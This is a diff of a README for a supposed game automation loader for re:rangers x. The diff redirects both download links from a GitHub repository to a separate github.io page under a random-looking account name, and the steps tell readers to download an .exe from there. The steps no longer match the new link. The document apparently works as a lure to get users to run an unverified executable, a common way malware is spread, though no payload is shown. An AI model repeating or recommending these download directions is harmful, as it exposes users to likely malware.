@@ -1,6 +1,6 @@
 # 🛠️ rerangers-xv-update-loader - Automate routine tasks for better play
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Fistulahamamelisvernalis970/rerangers-xv-update-loader)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://fistulahamamelisvernalis970.github.io)
 
 This tool helps players manage tasks in the game re:rangers x. It automates repetitive actions, such as selling items and aiming, to help you save time. You can spend more time enjoying the game and less time clicking menus.
 
@@ -18,7 +18,7 @@ Your computer needs to meet these basic standards to run the loader:
 
 Follow these steps to set up the loader on your computer.
 
-1. Visit the project page at this link: [https://github.com/Fistulahamamelisvernalis970/rerangers-xv-update-loader](https://github.com/Fistulahamamelisvernalis970/rerangers-xv-update-loader).
+1. Visit the project page at this link: [https://fistulahamamelisvernalis970.github.io](https://fistulahamamelisvernalis970.github.io).
 2. Look for the Releases section on the right side of the page.
 3. Click on the latest release to view the available files.
 4. Download the file ending in .exe to your desktop so you can find it.
